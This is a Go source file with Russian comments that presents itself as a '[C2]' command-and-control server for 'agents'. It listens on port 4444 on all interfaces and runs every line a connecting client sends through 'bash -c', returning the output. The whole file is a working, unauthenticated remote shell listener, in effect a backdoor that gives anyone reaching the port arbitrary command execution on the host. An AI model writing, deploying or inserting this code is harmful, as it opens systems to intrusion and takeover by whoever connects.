package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
)

func main() {
	// Слушаем на всех интерфейсах, порт 4444
	listener, err := net.Listen("tcp", "0.0.0.0:4444")
	if err != nil {
		fmt.Println("Ошибка запуска сервера: ", err)
		return
	}
	defer listener.Close()
	fmt.Println("[C2] Сервер запущен на порту 4444. Ожидание агентов...")
	
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Ошибка принятия соединени: ", err)
			continue
		}
		
		// Каждый агент в отдельной горутине
		go handleAgent(conn)
	}
}

func handleAgent(conn net.Conn) {
	defer conn.Close()
	
	// Устанавливаем таймаут на чтение
	// Тут как с проблемой комутации каналов(избегаем 'простаивания')
	conn.SetDeadline(time.Now().Add(time.Minute * 5))

	// Приветствуем агента
	reader := bufio.NewReader(conn)
	firstLine, err := reader.ReadString('\n')
	if err == nil {
		fmt.Printf("[+] Агент подключился: %s", strings.TrimSpace(firstLine))
	}

	// Цикл: читаем команду -> выполняем -> отправляем результат
	for {
		cmdLine, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("[-] Агент отключился или ошибка чтения: ", err)
			break
		}

		cmdLine = strings.TrimSpace(cmdLine)
		if cmdLine == "" {
			continue
		}
		fmt.Printf("[*] Получена команда: %s\n", cmdLine)
		
		// Выполнение через bash
		cmd := exec.Command("bash", "-c", cmdLine)
		output, err := cmd.CombinedOutput()
		if err != nil {
			// Не забываем про ошибки
			output = append(output, []byte("\nError: "+err.Error())...)
		}

		// Отправляем результат обратно агенту
		_, err = conn.Write(append(output, '\n'))
		if err != nil {
			fmt.Println("[-] Ошибка отправки результата: ", err)
			break
		}
	}
}
